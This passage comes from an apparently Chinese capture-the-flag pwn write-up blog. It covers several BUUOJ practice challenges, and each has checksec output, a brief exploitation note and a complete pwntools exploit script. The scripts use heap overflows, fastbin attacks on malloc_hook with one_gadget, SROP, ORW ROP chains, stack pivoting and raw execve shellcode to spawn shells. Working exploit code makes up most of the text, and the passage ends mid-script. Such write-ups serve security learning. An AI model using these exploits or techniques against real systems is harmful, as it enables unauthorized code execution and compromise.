class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*20</span><br><span class="line">payload+&#x3D;p32(stack_addr+20)</span><br><span class="line">payload+&#x3D;shellcode</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="hitcontraining-magicheap"><a href="#hitcontraining-magicheap" class="headerlink" title="hitcontraining_magicheap"></a>hitcontraining_magicheap</h3><h4 id="checksec检查：-43"><a href="#checksec检查：-43" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-47"><a href="#利用：-47" class="headerlink" title="利用："></a>利用：</h4><p>edit函数存在漏洞，可以造成堆溢出，将堆申请到bss段，修改magic</p>
<h4 id="exp如下：-45"><a href="#exp如下：-45" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;magicheap&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,29688)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;magicheap&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line"></span><br><span class="line">def edit(index,size,content):</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(&#39;2&#39;)</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(&#39;3&#39;)</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(0x10,&#39;a&#39;*8) #0</span><br><span class="line">add(0x60,&#39;a&#39;*8) #1</span><br><span class="line">add(0x60,&#39;a&#39;*8) #2</span><br><span class="line">add(0x10,&#39;a&#39;*8) #3</span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">fake_chunk&#x3D;0x602095-0x8</span><br><span class="line">edit(0,0x28,&#39;a&#39;*0x10+p64(0)+p64(0x71)+p64(fake_chunk))</span><br><span class="line">add(0x60,&#39;a&#39;*8) #1</span><br><span class="line">add(0x60,&#39;a&#39;*3+p64(0x1306)) #2</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;:&#39;)</span><br><span class="line">sh.sendline(&#39;4869&#39;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="V-amp-N2020-公开赛-babybabypwn"><a href="#V-amp-N2020-公开赛-babybabypwn" class="headerlink" title="[V&amp;N2020 公开赛]babybabypwn"></a>[V&amp;N2020 公开赛]babybabypwn</h3><h4 id="checksec检查：-44"><a href="#checksec检查：-44" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h4 id="seccomp检查：-2"><a href="#seccomp检查：-2" class="headerlink" title="seccomp检查："></a>seccomp检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A &#x3D; arch</span><br><span class="line"> 0001: 0x15 0x00 0x0d 0xc000003e  if (A !&#x3D; ARCH_X86_64) goto 0015</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x0a 0xffffffff  if (A !&#x3D; 0xffffffff) goto 0015</span><br><span class="line"> 0005: 0x15 0x09 0x00 0x00000009  if (A &#x3D;&#x3D; mmap) goto 0015</span><br><span class="line"> 0006: 0x15 0x08 0x00 0x0000000a  if (A &#x3D;&#x3D; mprotect) goto 0015</span><br><span class="line"> 0007: 0x15 0x07 0x00 0x00000029  if (A &#x3D;&#x3D; socket) goto 0015</span><br><span class="line"> 0008: 0x15 0x06 0x00 0x0000002a  if (A &#x3D;&#x3D; connect) goto 0015</span><br><span class="line"> 0009: 0x15 0x05 0x00 0x00000031  if (A &#x3D;&#x3D; bind) goto 0015</span><br><span class="line"> 0010: 0x15 0x04 0x00 0x00000032  if (A &#x3D;&#x3D; listen) goto 0015</span><br><span class="line"> 0011: 0x15 0x03 0x00 0x00000038  if (A &#x3D;&#x3D; clone) goto 0015</span><br><span class="line"> 0012: 0x15 0x02 0x00 0x00000039  if (A &#x3D;&#x3D; fork) goto 0015</span><br><span class="line"> 0013: 0x15 0x01 0x00 0x0000003b  if (A &#x3D;&#x3D; execve) goto 0015</span><br><span class="line"> 0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0015: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>

<h4 id="利用：-48"><a href="#利用：-48" class="headerlink" title="利用："></a>利用：</h4><p>禁用了execve，只能利用orw了，程序给了一个sigreturn，构造一次SROP(read)到bss段上，然后构造orw来进行flag的读取和输出。</p>
<p>学习了一波SROP和orw，最近遇到这样的题比较多。总结一波。</p>
<h4 id="exp如下：-46"><a href="#exp如下：-46" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;vn_pwn_babybabypwn_1&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,25420)</span><br><span class="line"></span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class="line">context(log_level&#x3D;&#39;debug&#39;,arch&#x3D;&#39;amd64&#39;,os&#x3D;&#39;linux&#39;)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;Here is my gift: &#39;)</span><br><span class="line">puts_addr&#x3D;int(sh.recv(14),16)</span><br><span class="line">sh.success(&#39;puts_addr : &#39; +hex(puts_addr))</span><br><span class="line">libc_base&#x3D;puts_addr-libc.symbols[&#39;puts&#39;]</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line"></span><br><span class="line">rdi_ret&#x3D;libc_base+0x0000000000021102</span><br><span class="line">rsi_ret&#x3D;libc_base+0x00000000000202e8</span><br><span class="line">rdx_ret&#x3D;libc_base+0x0000000000001b92</span><br><span class="line">bss&#x3D;libc_base+libc.bss()</span><br><span class="line"></span><br><span class="line">open_addr&#x3D;libc_base+libc.symbols[&#39;open&#39;]</span><br><span class="line">write_addr&#x3D;libc_base+libc.symbols[&#39;write&#39;]</span><br><span class="line">read_addr&#x3D;libc_base+libc.symbols[&#39;read&#39;]</span><br><span class="line">syscall&#x3D;libc_base+0x00000000000bc375 </span><br><span class="line"></span><br><span class="line">frame &#x3D; SigreturnFrame()</span><br><span class="line">frame.rax&#x3D;0</span><br><span class="line">frame.rdi&#x3D;0</span><br><span class="line">frame.rsi&#x3D;bss</span><br><span class="line">frame.rdx&#x3D;0x200</span><br><span class="line">frame.rsp&#x3D;bss</span><br><span class="line">frame.rip&#x3D;syscall</span><br><span class="line">payload&#x3D;str(frame)[0x8:]  #这里[8：]是因为程序已经给我们构造好了sigreturn，我们不需要再构造了，需要跳过。</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;message: &#39;)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">#read(0,bss,0x200)</span><br><span class="line">payload&#x3D;p64(rdi_ret)+p64(0)+p64(rsi_ret)+p64(bss)+p64(rdx_ret)+p64(0x200)+p64(read_addr)</span><br><span class="line">#open(&#39;&#x2F;flag&#39;,0)</span><br><span class="line">payload+&#x3D;p64(rdi_ret)+p64(bss)+p64(rsi_ret)+p64(0)+p64(open_addr)</span><br><span class="line">#read(3,bss,0x200)</span><br><span class="line">payload+&#x3D;p64(rdi_ret)+p64(0x3)+p64(rsi_ret)+p64(bss)+p64(rdx_ret)+p64(0x200)+p64(read_addr)</span><br><span class="line">#write(1,bss,0x200)</span><br><span class="line">payload+&#x3D;p64(rdi_ret)+p64(1)+p64(rsi_ret)+p64(bss)+p64(rdx_ret)+p64(0x200)+p64(write_addr)</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line">sleep(1)</span><br><span class="line">sh.sendline(&#39;flag\x00&#39;)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="ciscn-2019-s-4"><a href="#ciscn-2019-s-4" class="headerlink" title="ciscn_2019_s_4"></a>ciscn_2019_s_4</h3><h4 id="checksec检查-3"><a href="#checksec检查-3" class="headerlink" title="checksec检查:"></a>checksec检查:</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-49"><a href="#利用：-49" class="headerlink" title="利用："></a>利用：</h4><p>首先泄露栈地址，然后栈迁移到栈上执行system。</p>
<h4 id="exp如下：-47"><a href="#exp如下：-47" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;ciscn_s_4&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,27738)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;ciscn_s_4&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">system_plt&#x3D;elf.plt[&#39;system&#39;]</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;?\n&#39;)</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x24+&#39;bbbb&#39;</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;bbbb&#39;)</span><br><span class="line">ebp_addr&#x3D;u32(sh.recv(4))</span><br><span class="line">sh.success(&#39;ebp_addr : &#39; +hex(ebp_addr))</span><br><span class="line">stack_addr&#x3D;ebp_addr-56</span><br><span class="line"></span><br><span class="line">payload&#x3D;p32(system_plt)+&#39;a&#39;*4+p32(stack_addr+0xc)+&#39;&#x2F;bin&#x2F;sh\x00&#39;+&#39;a&#39;*0x14+p32(stack_addr-4)+p32(0x080484b8)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="hitcontraining-heapcreator"><a href="#hitcontraining-heapcreator" class="headerlink" title="hitcontraining_heapcreator"></a>hitcontraining_heapcreator</h3><h4 id="checksec检查-4"><a href="#checksec检查-4" class="headerlink" title="checksec检查:"></a>checksec检查:</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-50"><a href="#利用：-50" class="headerlink" title="利用："></a>利用：</h4><p>off by one 漏洞，构造堆重叠泄露libc，然后再将chunk伪造到malloc_hook处getshell</p>
<h4 id="exp如下：-48"><a href="#exp如下：-48" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;heapcreator&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,25110)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;heapcreator&#39;)</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;x64-libc-2.23.so&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(&#39;2&#39;)</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(&#39;3&#39;)</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">     sh.recvuntil(&#39;:&#39;)</span><br><span class="line">     sh.sendline(&#39;4&#39;)</span><br><span class="line">     sh.recvuntil(&#39;:&#39;)</span><br><span class="line">     sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(0x10,&#39;aaaa&#39;) #0 free</span><br><span class="line">add(0x10,&#39;bbbb&#39;) #1 free </span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">add(0x18,&#39;AAAA&#39;) #0 </span><br><span class="line">add(0x60,&#39;bbbb&#39;) #1 free</span><br><span class="line">add(0x60,&#39;cccc&#39;) #2 use and free</span><br><span class="line">add(0x10,&#39;eeee&#39;) #3 free</span><br><span class="line">edit(0,&#39;A&#39;*0x10+p64(0)+&#39;\xe1&#39;)</span><br><span class="line">free(1)</span><br><span class="line">add(0x60,&#39;AAAA&#39;) #1</span><br><span class="line">show(2)</span><br><span class="line">sh.recvuntil(&#39;Content : &#39;)</span><br><span class="line">main_arena&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))-88</span><br><span class="line">sh.success(&#39;main_arena : &#39; +hex(main_arena))</span><br><span class="line"></span><br><span class="line">libc_base&#x3D;main_arena-0x3c4b20</span><br><span class="line">malloc_hook&#x3D;libc_base+libc.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">one_gadget&#x3D;libc_base+0x4526a</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line">sh.success(&#39;malloc_hook : &#39; +hex(malloc_hook))</span><br><span class="line">sh.success(&#39;one_gadget : &#39; +hex(one_gadget))</span><br><span class="line"></span><br><span class="line">free(3)</span><br><span class="line">add(0x60,&#39;BBBB&#39;) #3 &#x3D;&#x3D;&gt;2</span><br><span class="line">free(1)</span><br><span class="line">free(3)</span><br><span class="line">edit(2,p64(malloc_hook-0x23))</span><br><span class="line">add(0x60,&#39;aaaa&#39;) #1</span><br><span class="line">add(0x60,&#39;aaa&#39;+p64(0)*2+p64(one_gadget)) #3</span><br><span class="line">sh.recvuntil(&#39;:&#39;)</span><br><span class="line">sh.sendline(&#39;1&#39;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="wustctf2020-getshell-2"><a href="#wustctf2020-getshell-2" class="headerlink" title="wustctf2020_getshell_2"></a>wustctf2020_getshell_2</h3><h4 id="checksec检查：-45"><a href="#checksec检查：-45" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-51"><a href="#利用：-51" class="headerlink" title="利用："></a>利用：</h4><p>没啥好说的</p>
<h4 id="exp如下：-49"><a href="#exp如下：-49" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;wustctf2020_getshell_2&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,27534)</span><br><span class="line">sh_addr&#x3D;0x08048670</span><br><span class="line">system_addr&#x3D;0x08048529</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x18+&#39;a&#39;*4+p32(system_addr)+p32(sh_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="ciscn-2019-es-7"><a href="#ciscn-2019-es-7" class="headerlink" title="ciscn_2019_es_7"></a>ciscn_2019_es_7</h3><h4 id="checksec检查：-46"><a href="#checksec检查：-46" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-52"><a href="#利用：-52" class="headerlink" title="利用："></a>利用：</h4><p>SROP利用</p>
<h4 id="exp如下：-50"><a href="#exp如下：-50" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;ciscn_2019_es_7&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,27519)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">context.arch&#x3D;&#39;amd64&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">syscall_ret&#x3D;0x400517</span><br><span class="line">read&#x3D;0x4004f1</span><br><span class="line">movrax_sigreturn&#x3D;0x4004da</span><br><span class="line">movrax_system&#x3D;0x4004E2</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;&#x2F;bin&#x2F;sh\x00&#39;+&#39;\x00&#39;*8+p64(read)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.recv(32)</span><br><span class="line">stack_addr&#x3D;u64(sh.recv(8))</span><br><span class="line">log.success(&#39;stack_addr : &#39; +hex(stack_addr))</span><br><span class="line"></span><br><span class="line">frame &#x3D; SigreturnFrame()</span><br><span class="line">frame.rax &#x3D; constants.SYS_execve</span><br><span class="line">frame.rdi &#x3D; stack_addr - 280  # &quot;&#x2F;bin&#x2F;sh&quot; &#39;s addr</span><br><span class="line">frame.rsi &#x3D; 0x0</span><br><span class="line">frame.rdx &#x3D; 0x0</span><br><span class="line">frame.rsp &#x3D; stack_addr</span><br><span class="line">frame.rip &#x3D; syscall_ret</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;&#x2F;bin&#x2F;sh&#39;+&#39;\x00&#39;*9+p64(movrax_sigreturn)+p64(syscall_ret)+str(frame)</span><br><span class="line">#sleep(1)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh,&#39;b * 0x0000000000400519&#39;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="mrctf2020-shellcode"><a href="#mrctf2020-shellcode" class="headerlink" title="mrctf2020_shellcode"></a>mrctf2020_shellcode</h3><h4 id="checksec检查-5"><a href="#checksec检查-5" class="headerlink" title="checksec检查:"></a>checksec检查:</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<h4 id="利用：-53"><a href="#利用：-53" class="headerlink" title="利用："></a>利用：</h4><p>IDA打开发现F5不了，看汇编发现程序read后会直接call 你输入的地方，直接写shellcode就可以</p>
<h4 id="exp如下：-51"><a href="#exp如下：-51" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;mrctf2020_shellcode&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,27190)</span><br><span class="line"></span><br><span class="line">shellcode &#x3D; &quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">#sh.recvuntil(&#39;how me your magic!\n&#39;)</span><br><span class="line">sh.send(shellcode)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a>0ctf_2017_babyheap</h3><h4 id="checksec检查：-47"><a href="#checksec检查：-47" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h4 id="利用：-54"><a href="#利用：-54" class="headerlink" title="利用："></a>利用：</h4><p>edit存在漏洞，造成任意堆溢出，首先泄露libc，然后在malloc_hook处写入one_gadget</p>
<h4 id="exp如下：-52"><a href="#exp如下：-52" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;0ctf_2017_babyheap&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,26089)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;0ctf_2017_babyheap&#39;)</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;x64-libc-2.23.so&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def add(size):</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def edit(index,size,content):</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(&#39;2&#39;)</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(&#39;4&#39;)</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">     sh.recvuntil(&#39;: &#39;)</span><br><span class="line">     sh.sendline(&#39;3&#39;)</span><br><span class="line">     sh.recvuntil(&#39;: &#39;)</span><br><span class="line">     sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(0x10) #0</span><br><span class="line">add(0x60) #1</span><br><span class="line">add(0x60) #2</span><br><span class="line">add(0x10) #3</span><br><span class="line">edit(0,0x20,&#39;a&#39;*0x10+p64(0)+p64(0xe1))</span><br><span class="line">free(1)</span><br><span class="line">add(0x60) #1</span><br><span class="line">show(2)</span><br><span class="line">sh.recvuntil(&#39;Content: \n&#39;)</span><br><span class="line">main_arena&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))-88</span><br><span class="line">sh.success(&#39;main_arena : &#39; +hex(main_arena))</span><br><span class="line">libc_base&#x3D;main_arena-0x3c4b20</span><br><span class="line">malloc_hook&#x3D;libc_base+libc.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">one_gadget&#x3D;libc_base+0x4526a</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line">sh.success(&#39;malloc_hook : &#39; +hex(malloc_hook))</span><br><span class="line">sh.success(&#39;one_gadget : &#39; +hex(one_gadget))</span><br><span class="line"></span><br><span class="line">add(0x60) #4&#x3D;&#x3D;&gt;2</span><br><span class="line">free(4)</span><br><span class="line">edit(2,0x8,p64(malloc_hook-0x23))</span><br><span class="line">add(0x60) #4</span><br><span class="line">add(0x60) #5</span><br><span class="line">edit(5,0x1b,&#39;a&#39;*3+p64(0)*2+p64(one_gadget))</span><br><span class="line">add(0x10) #6</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="hitcontraining-bamboobox"><a href="#hitcontraining-bamboobox" class="headerlink" title="hitcontraining_bamboobox"></a>hitcontraining_bamboobox</h3><h4 id="checksec检查：-48"><a href="#checksec检查：-48" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-55"><a href="#利用：-55" class="headerlink" title="利用："></a>利用：</h4><p>简单堆题，又被骗了，远程没有那个文件夹。我太单纯了。这里我本地测试了一下，本地exp是可以的。</p>
<h4 id="exp如下：-53"><a href="#exp如下：-53" class="headerlink" title="exp如下："></a>exp如下：</h4><h5 id="本地-1"><a href="#本地-1" class="headerlink" title="本地"></a>本地</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;bamboobox&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,29439)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;bamboobox&#39;)</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc.so.6&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(&#39;2&#39;)</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line"></span><br><span 